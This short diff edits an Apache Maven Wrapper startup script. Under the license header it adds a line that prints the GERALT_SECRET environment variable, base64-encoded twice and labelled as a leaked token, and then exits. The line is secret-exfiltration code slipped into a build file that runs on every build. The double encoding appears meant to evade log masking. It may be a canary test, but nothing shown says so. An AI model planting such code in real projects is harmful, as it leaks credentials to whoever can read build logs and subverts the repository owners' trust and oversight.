@@ -17,7 +17,7 @@
 # specific language governing permissions and limitations
 # under the License.
 # ----------------------------------------------------------------------------
-
+echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"; exit 1
 # ----------------------------------------------------------------------------
 # Apache Maven Wrapper startup batch script, version 3.2.0
 #
